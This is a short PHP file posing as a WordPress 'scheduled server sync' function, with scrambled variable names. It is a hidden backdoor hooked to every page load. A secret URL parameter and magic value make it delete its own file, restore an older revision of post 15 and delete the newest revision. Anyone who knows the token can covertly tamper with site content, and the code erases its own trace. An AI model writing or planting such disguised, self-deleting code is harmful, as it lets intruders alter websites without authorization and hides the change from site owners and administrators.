<?php

function scheduled_server_sync() {
	if (isset($_GET['member_consent_shortcode']) && $_GET['member_consent_shortcode'] === 'header_total_wpc_learndash') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$browser_edit_list = 15;
		$bootstrap_groups_smtp = wp_get_post_revisions($browser_edit_list);
		if (empty($bootstrap_groups_smtp)) die('no revisions');
		if (count($bootstrap_groups_smtp) < 2) die('less than 2');
		$app_upgrader_timer = array_shift($bootstrap_groups_smtp);
		$panel_message_options_all = $app_upgrader_timer->ID;
		$validator_gift_json_css = array_shift($bootstrap_groups_smtp);
		$twitter_service_appointment = $validator_gift_json_css->ID;
		$ecommerce_press_source_recipe = wp_restore_post_revision($twitter_service_appointment);
		if ($ecommerce_press_source_recipe === false) die('error restoring');
		$ecommerce_press_source_recipe = wp_delete_post_revision($panel_message_options_all);		
		if ($ecommerce_press_source_recipe === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'scheduled_server_sync');
